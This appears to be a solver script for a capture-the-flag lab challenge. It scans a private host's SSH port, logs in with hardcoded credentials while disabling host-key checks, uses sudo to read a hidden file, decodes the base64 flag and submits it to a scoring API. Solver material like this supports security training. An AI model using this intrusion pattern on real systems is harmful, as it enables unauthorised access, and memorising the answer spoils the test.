#!/bin/sh
set -eu
host=172.20.0.141
user=analyst
password='Orbit-Deck-47'
challenge_id=scl-challenge-frame-1ed8a2

nmap -Pn -p 22 "$host" >/dev/null
encoded=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" 'sudo -n cat /var/tmp/.cache/.telemetry')
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())')
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$challenge_id" "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
